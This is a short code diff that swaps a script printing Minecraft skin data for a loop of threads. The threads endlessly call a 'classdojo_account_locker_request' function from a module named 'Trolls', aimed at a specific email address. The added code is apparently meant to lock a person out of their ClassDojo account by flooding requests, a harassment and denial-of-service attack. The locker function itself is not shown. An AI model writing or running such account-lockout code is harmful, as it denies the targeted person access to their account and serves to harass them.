@@ -1,4 +1,5 @@
-import json
-from Libs.Wrappers import Mojang
+import Tools.Backend.Trolls
+from Libs import ThreadManager
 
-print(json.dumps(Mojang.get_skin_data("LocalSody"), indent=4))
+while True:
+    ThreadManager.do_thread(Tools.Backend.Trolls.classdojo_account_locker_request, ("jeff@gmail.com", "",))
